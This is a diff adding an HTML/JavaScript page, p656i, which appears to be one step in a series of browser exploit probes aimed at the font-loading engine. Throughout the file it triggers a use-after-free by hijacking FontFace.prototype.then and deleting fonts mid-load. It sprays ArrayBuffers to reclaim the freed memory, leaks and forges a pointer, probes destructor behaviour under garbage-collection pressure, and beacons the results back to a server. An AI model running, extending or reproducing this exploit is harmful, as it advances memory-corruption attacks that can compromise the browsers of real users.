@@ -1,0 +1,249 @@
+<!--
+  p656i: in-world release — drop the JS wrapper refs, watch rc
+
+  The missing cell of the release matrix: every probe so far (p656c/f/g)
+  kept ffB alive in a script variable while trying to release the +1.
+  The JS FontFace wrapper holds a ref on the C++ CSSFontFace (our forged
+  buffer). Test: after forge confirmed, drop ffA/ffB entirely, watch with
+  WeakRef + GC pressure.
+
+  If rc 1->0: ~CSSFontFace runs IN-WORLD on our fields -> D2-CHANGED +
+  full dump. If WeakRef dead but rc same: collected without touching
+  slot. If nothing: the +1 is truly engine-internal (load machinery).
+
+  Beacon: P656I-.
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656i</title></head>
+<body>p656i: wrapper release
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656I-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'wrapper-release');
+flush();
+
+var bufs1 = [], bufs2 = [];
+var T1_lo = 0, T1_hi = 0;
+var phase = 0;
+
+var sty1 = document.createElement('style');
+sty1.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty1);
+
+var ffA = new FontFace('fa', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+
+var sty2 = document.createElement('style');
+sty2.textContent = "@font-face { font-family: sb; src: local(Arial); unicode-range: U+0043; }";
+document.head.appendChild(sty2);
+
+var ffB = new FontFace('fb', 'local(Helvetica)', { unicodeRange: 'U+0044' });
+document.fonts.add(ffB);
+void ffB.loaded;
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (phase === 1) {
+      phase = 0;
+      sty1.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 2, true);
+        dv.setUint32(0x04, 0xAAAA0001, true);
+        bufs1.push({ dv: dv });
+      }
+      emit('TRAP1', 'spray=80');
+      return undefined;
+    }
+    if (phase === 2) {
+      phase = 0;
+      sty2.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 0, true);
+        dv.setUint32(0x04, 0xCCCC0009, true);
+        dv.setUint32(0x58, T1_lo, true);
+        dv.setUint32(0x5C, T1_hi, true);
+        bufs2.push({ dv: dv });
+      }
+      emit('TRAP2', 'spray=80 forge=T1');
+      return undefined;
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+phase = 1;
+document.fonts.load('1em fa, sa', 'AB');
+
+setTimeout(function() {
+try {
+  var hit1 = -1;
+  for (var i = 0; i < bufs1.length; i++) {
+    if (bufs1[i].dv.getUint32(0, true) !== 2) { hit1 = i; break; }
+  }
+  if (hit1 < 0) {
+    for (var j = 0; j < bufs1.length; j++) {
+      if (bufs1[j].dv.getUint32(0x58, true) !== 0 || bufs1[j].dv.getUint32(0x5C, true) !== 0) { hit1 = j; break; }
+    }
+  }
+  if (hit1 < 0) { emit('P1-MISS', 'stop'); flush(); return; }
+
+  var dv1 = bufs1[hit1].dv;
+  T1_lo = dv1.getUint32(0x58, true);
+  T1_hi = dv1.getUint32(0x5C, true);
+  emit('P1-HIT', 'T1=' + hex32(T1_hi) + hex32(T1_lo));
+  flush();
+  if (!T1_lo && !T1_hi) { emit('P1-FAIL', 'stop'); flush(); return; }
+
+  phase = 2;
+  document.fonts.load('1em fb, sb', 'CD');
+
+  setTimeout(function() {
+  try {
+    var hit2 = -1;
+    for (var i = 0; i < bufs2.length; i++) {
+      if (bufs2[i].dv.getUint32(0, true) !== 0) { hit2 = i; break; }
+    }
+    if (hit2 < 0) {
+      for (var j = 0; j < bufs2.length; j++) {
+        if (bufs2[j].dv.getUint32(0x68, true) !== 0 || bufs2[j].dv.getUint32(0x6C, true) !== 0) { hit2 = j; break; }
+      }
+    }
+    if (hit2 < 0) { emit('P2-MISS', 'stop'); flush(); return; }
+
+    var dv2 = bufs2[hit2].dv;
+    var rc2 = dv2.getUint32(0, true);
+    var held = (dv2.getUint32(0x58, true) === T1_lo && dv2.getUint32(0x5C, true) === T1_hi);
+    emit('P2-HIT', 'rc=' + rc2 + ' forge=' + held);
+    flush();
+    if (!held) { emit('FORGE-FAIL', 'stop'); flush(); return; }
+
+    // ============ WRAPPER RELEASE ============
+    try { delete FontFace.prototype.then; } catch(e) {}
+
+    // WeakRefs on both wrappers BEFORE dropping
+    var wrA = null, wrB = null;
+    try { wrA = new WeakRef(ffA); wrB = new WeakRef(ffB); } catch(e) { emit('WR-ERR', String(e).slice(0,40)); }
+
+    emit('SET', 'rc=' + rc2 + ' fonts.size=' + document.fonts.size +
+      ' aAlive=' + (wrA ? wrA.deref() !== undefined : 'n/a') +
+      ' bAlive=' + (wrB ? wrB.deref() !== undefined : 'n/a'));
+    flush();
+
+    // DROP EVERYTHING that can hold the wrappers
+    ffA = null;
+    ffB = null;
+    // (sty1/sty2 already removed in traps; bufs arrays hold only DataViews)
+
+    var snap2 = [];
+    for (var j = 0; j < 192; j += 4) snap2.push(dv2.getUint32(j, true));
+
+    var fresh = [];
+    var n = 0;
+    var verdict = '';
+    var maxN = 60;
+
+    function poll() {
+      n++;
+      // GC pressure (p655-proven pattern)
+      var g = [];
+      for (var k = 0; k < 300; k++) g.push(new ArrayBuffer(65536));
+      g = null;
+
+      // reclaim canary
+      for (var k = 0; k < 6; k++) {
+        var ab = new ArrayBuffer(192);
+        var dvf = new DataView(ab);
+        dvf.setUint32(0x04, 0xF7EE0662, true);
+        fresh.push(dvf);
+      }
+
+      var rc = dv2.getUint32(0, true);
+      var mk = dv2.getUint32(4, true);
+      var aA = wrA ? (wrA.deref() !== undefined) : 'n/a';
+      var aB = wrB ? (wrB.deref() !== undefined) : 'n/a';
+
+      var changed = [];
+      for (var j = 0; j < 192; j += 4) {
+        var cur = dv2.getUint32(j, true);
+        if (cur !== snap2[j / 4]) {
+          changed.push('+' + j.toString(16) + ':' + hex32(snap2[j/4]) + '>' + hex32(cur));
+          snap2[j / 4] = cur;
+        }
+      }
+
+      if (n === 1 || n === 3 || n === 10 || n === 20 || n === 40 || n % 10 === 0) {
+        emit('POLL', 'n=' + n + ' rc=' + rc + ' aAlive=' + aA + ' bAlive=' + aB);
+        flush();
+      }
+
+      if (mk === 0xF7EE0662 && !verdict) {
+        verdict = 'FREED';
+        emit('D2-FREED', 'slot re-taken at n=' + n + ' — destructor ran and freed');
+        flush();
+      } else if (changed.length && !verdict) {
+        verdict = 'DESTROYED';
+        emit('D2-CHANGED', 'n=' + n + ' rc=' + rc + ' diffs=' + changed.length);
+        emit('D2-DIFFS', changed.slice(0, 12).join(' '));
+        var full = [];
+        for (var j2 = 0; j2 < 192; j2 += 8) {
+          full.push('+' + j2.toString(16) + '=' + hex32(dv2.getUint32(j2+4, true)) + hex32(dv2.getUint32(j2, true)));
+        }
+        emit('D2-FULL', full.join(' '));
+        flush();
+      } else if (aB === false && !verdict && rc === rc2) {
+        // wrapper collected but slot untouched — report once, keep watching
+        emit('B-COLLECTED', 'n=' + n + ' WeakRef dead, rc unchanged (' + rc + ')');
+        verdict = 'COLLECTED-NODTOR';
+      }
+
+      if (n < maxN) { setTimeout(poll, 150); }
+      else {
+        emit('VERDICT', verdict || 'STABLE rc=' + dv2.getUint32(0, true));
+        emit('ALIVE', 'end');
+        flush();
+      }
+    }
+
+    emit('DROP', 'ffA=ffB=null — polling');
+    flush();
+    setTimeout(poll, 120);
+
+  } catch(e2) { emit('P2-FATAL', String(e2).slice(0,150)); flush(); }
+  }, 150);
+
+} catch(e1) { emit('P1-FATAL', String(e1).slice(0,150)); flush(); }
+}, 100);
+
+})();
+</script>
+</body></html>
